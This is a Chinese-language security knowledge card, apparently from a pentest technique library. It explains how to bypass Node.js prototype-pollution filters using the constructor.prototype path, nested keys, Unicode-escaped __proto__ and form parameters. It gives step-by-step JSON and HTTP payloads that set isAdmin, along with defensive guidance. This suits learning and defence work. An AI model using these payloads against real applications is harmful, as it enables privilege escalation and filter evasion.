---
id: web-nodejs-prototype-pollution-filter-bypass
title: 原型链污染过滤绕过：constructor.prototype、嵌套键、Unicode 转义与表单解析
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: js-prototype-pollution-filter-bypass
aliases:
- 原型链污染绕过
- __proto__ 过滤绕过
- constructor prototype 污染
- Unicode 转义 __proto__
- 表单原型链污染
- prototype pollution bypass
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- javascript
- nodejs
- prototype-pollution
- bypass
- constructor-prototype
- unicode-escape
- waf-bypass
cve: []
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:35:05+08:00'
  notes: 已对照原文核对 constructor.prototype 等价路径、嵌套顶层键、Unicode 转义与表单参数绕过写法；已修正正文中 Unicode 转义说明被转义破坏的表述；未验证点：原文表单绕过仅给写法，未验证具体解析器
---

## 一句话结论

当 merge/解析逻辑只过滤字面量 `__proto__` 或只检查顶层键时，可以用 `constructor.prototype` 等价路径、在无害顶层键下嵌套危险键、用 JSON Unicode 转义拼出 `__proto__`，或改用表单参数解析（`__proto__[x]=1`）继续污染 `Object.prototype`；绕过能否成立取决于过滤发生在解析前还是解析后、以及解析器是否保留危险键。

## 原理

- **用 `constructor.prototype` 替代 `__proto__`**：对任意对象 `p`，`p.__proto__ === p.constructor.prototype`。因为 `p` 自身通常没有 `constructor`，访问会沿原型链找到构造函数 `Person`，而 `Person.prototype` 正是 `p` 的原型。因此 `{"constructor":{"prototype":{"isAdmin":1}}}` 在 merge 递归到 `constructor` → `prototype` 时，同样落到共享原型，绕过只匹配 `__proto__` 字符串的过滤。
- **嵌套无害顶层键**：过滤器若只检查请求体第一层键名，把危险键放进 `a.constructor.prototype` 或 `a.__proto__` 即可；merge 的递归会进入第二层，过滤逻辑却已放行。
- **Unicode 转义**：JSON 字符串允许用 \u005f 表示下划线。`{"\u005f\u005fproto\u005f\u005f":{"isAdmin":1}}` 在 JSON 解析阶段被还原为 `__proto__`；如果过滤器在解析前对原始字符串做关键字匹配，或只匹配字面量 `__proto__`，就会漏过。解析后再做键名校验才能拦住。
- **表单/查询参数解析**：`qs`、`body-parser` 等解析器会把 `__proto__[isAdmin]=1` 或 `constructor[prototype][isAdmin]=1` 解析成嵌套对象；若解析器版本未修复或未禁用原型键，后续 merge/赋值即可污染原型。危险点在于解析器是否把键当成普通自有属性。
- 绕过成立的根本条件仍然是：危险键最终以可枚举自有属性的形式进入递归合并，且过滤没有在**解析后**对所有层级的键做规范化校验。

## 触发条件

- 目标存在原型链污染 sink（递归 merge、`Object.assign` 封装、`_.merge`/`_.set` 等）。
- 存在过滤，但过滤方式存在以下之一：只匹配 `__proto__` 字面量、只检查顶层键、在 JSON 解析前做字符串匹配、依赖不安全的表单解析器。
- 请求体/参数能被目标框架解析为嵌套对象，且解析器保留 `__proto__`/`constructor` 键。
- 被污染属性有实际读取点。

## 利用步骤

1. 先确认基线：发送 `{"__proto__":{"x":1}}` 观察是否被拦截或是否生效。
2. 若 `__proto__` 被过滤，改用 `constructor.prototype`：
   ```json
   {"constructor":{"prototype":{"isAdmin":1}}}
   ```
3. 若只过滤顶层键，嵌套一层：
   ```json
   {"a":{"constructor":{"prototype":{"isAdmin":1}}}}
   ```
4. 若做关键字字符串匹配，用 Unicode 转义：
   ```json
   {"\u005f\u005fproto\u005f\u005f":{"isAdmin":1}}
   ```
5. 若 JSON 入口被严格过滤，尝试表单/查询参数：
   ```text
   __proto__[isAdmin]=1
   constructor[prototype][isAdmin]=1
   ```
6. 通过新请求/新对象读取污染属性，确认全局生效并评估业务影响。

## PoC

`constructor.prototype` 路径：

```javascript
function Person() {}
const p = new Person();
console.log(p.constructor.prototype === p.__proto__);   // true

const payload = JSON.parse('{"constructor":{"prototype":{"isAdmin":1}}}');
merge({}, payload);
console.log(({}).isAdmin);   // 1
```

顶层键过滤绕过：

```json
{"a":{"constructor":{"prototype":{"isAdmin":1}}}}
```

Unicode 转义：

```json
{"\u005f\u005fproto\u005f\u005f":{"isAdmin":1}}
```

表单参数：

```http
POST /api/config HTTP/1.1
Content-Type: application/x-www-form-urlencoded

__proto__[isAdmin]=1
```

（表单写法能否生效取决于服务端解析器是否保留原型键；部分框架/版本会直接丢弃或使用 `Object.create(null)`。）

## 变体与关联

- 与 `__proto__` 直接污染卡共用同一 merge sink；本卡只讨论过滤绕过。
- 其他等价路径：`constructor[prototype]`、`prototype`（需先拿到构造函数本身）、`__defineGetter__`/`__defineSetter__`（可定义 getter 改变读取行为）。
- 前端侧的过滤绕过还可利用 `Object.prototype` 上的 `toString`/`valueOf` 等 gadget。
- 若目标使用 `JSON.parse` 且过滤发生在解析后，Unicode 转义会被还原，必须做键名规范化而非原文匹配。

## 检测与防御

- 过滤必须在**解析之后**、对**所有层级**的键做规范化校验，拒绝 `__proto__`、`constructor`、`prototype`（含 Unicode 转义还原后的结果）。
- 使用 `Object.create(null)`/`Map` 作为合并容器；合并前用允许键白名单，而不是字符串黑名单。
- 升级/配置安全的参数解析器，禁用原型键解析；对 `qs` 等库确认已修复相关 CVE。
- 代码审计关注过滤实现的位置（解析前还是解析后）与递归深度；只检查第一层键是常见缺陷。
- 运行时检测请求体中的 `__proto__`、`constructor[prototype]`、`_` 组合及异常的继承属性读取。
